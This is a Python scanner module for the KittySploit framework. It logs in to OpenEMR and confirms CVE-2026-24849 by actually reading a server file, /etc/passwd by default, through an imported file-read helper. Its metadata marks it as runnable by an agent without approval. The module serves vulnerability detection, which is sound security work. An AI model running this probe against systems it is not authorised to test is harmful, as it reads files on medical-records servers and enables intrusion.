#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.openemr_cve_2026_24849 import (
    LOGIN_PATH,
    looks_like_etc_passwd,
    looks_like_openemr_login,
    openemr_login,
    openemr_path,
    openemr_read_file,
)


class Module(Scanner, Http_client):

    __info__ = {
        "name": "OpenEMR CVE-2026-24849 authenticated file-read detection",
        "description": (
            "Authenticates to OpenEMR and probes the Fax/SMS EtherFax disposeDoc/disposeDocument "
            "arbitrary file read affecting OpenEMR < 7.0.4."
        ),
        "author": ["doany1", "KittySploit Team"],
        "severity": "high",
        "cve": "CVE-2026-24849",
        "references": [
            "https://github.com/openemr/openemr/security/advisories/GHSA-w6vc-hx2x-48pc",
            "https://nvd.nist.gov/vuln/detail/CVE-2026-24849",
        ],
        "modules": [
            "exploits/multi/http/openemr_cve_2026_24849_file_read",
        ],
        "tags": ["web", "scanner", "openemr", "authenticated", "file-read", "cve-2026-24849"],
    'agent': {
        'risk': 'active',
        'effects': ['network_probe'],
        'expected_requests': 2,
        'reversible': True,
        'approval_required': False,
        'produces': ['tech_hints', 'risk_signals', 'endpoints'],
    },
    }

    port = OptPort(80, "OpenEMR HTTP port", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    base_path = OptString("/openemr", "OpenEMR base path (use / if installed at web root)", required=True)
    site = OptString("default", "OpenEMR site id", required=True)
    username = OptString("", "OpenEMR username for active check", required=True)
    password = OptString("", "OpenEMR password for active check", required=True)
    probe_file = OptString(
        "/etc/passwd",
        "Root-owned file used for confirmation; avoid files the web user can delete",
        required=False,
        advanced=True,
    )

    def _fingerprint_login(self) -> bool:
        resp = self.http_request(
            method="GET",
            path=openemr_path(self.base_path, LOGIN_PATH),
            params={"site": self.site or "default"},
            allow_redirects=True,
            timeout=15,
        )
        return bool(resp and resp.status_code == 200 and looks_like_openemr_login(resp.text or ""))

    def run(self):
        try:
            login_seen = self._fingerprint_login()
            if not login_seen:
                return False

            openemr_login(self, self.base_path, self.site, self.username, self.password)
            data, status, action = openemr_read_file(
                self,
                self.base_path,
                self.site,
                self.probe_file or "/etc/passwd",
                timeout=20,
            )
        except Exception as e:
            print_error(f"Scanner failed: {e}")
            return False

        if status == "session":
            print_error("OpenEMR login page detected, but supplied credentials/site were rejected")
            return False

        if status == "missing":
            self.set_info(
                severity="info",
                cve="CVE-2026-24849",
                reason="OpenEMR login detected; authenticated probe did not reach a readable Fax/SMS EtherFax file-read",
            )
            return False

        probe = str(self.probe_file or "/etc/passwd")
        high_confidence = probe == "/etc/passwd" and looks_like_etc_passwd(data or "")
        self.set_info(
            severity="high",
            cve="CVE-2026-24849",
            reason=(
                f"Authenticated OpenEMR Fax/SMS file-read returned {len(data or '')} bytes "
                f"from {probe} via {action}"
            ),
            confidence="high" if high_confidence else "medium",
            action=action,
        )
        return True
